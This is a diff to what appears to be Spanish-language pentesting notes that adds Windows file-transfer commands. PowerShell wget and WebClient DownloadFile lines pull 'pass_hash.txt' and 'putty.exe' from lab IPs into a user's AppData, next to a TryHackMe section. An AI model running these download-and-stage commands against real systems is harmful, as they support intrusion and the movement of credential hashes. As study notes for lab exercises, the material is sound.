@@ -217,6 +217,25 @@ Solo esta en powershell
 ```
 wget http://192.168.142.8:8083/pass_hash.txt -outfile C:\Users\g\AppData\Roaming\pass_hash.txt
 ```
+lo podemos usar en CMD
+
+```
+powershell.exe wget http://192.168.1.2/putty.exe -OutFile putty.exe
+```
+
+### PowerShell New-Object System.Net.WebClient
+
+Desde el CMD 
+
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.18.142.128:8083/pass_hash.txt', 'C:\Users\g\AppData\Roaming\pass_hash.txt')
+```
+Desde PS
+
+```
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.142.128:8083/pass_hash.txt', 'C:\Users\gerardo.cruz\AppData\Roaming\pass_hash.txt')
+```
+
 
 ## Lian_Yu (Tryhackme)
 
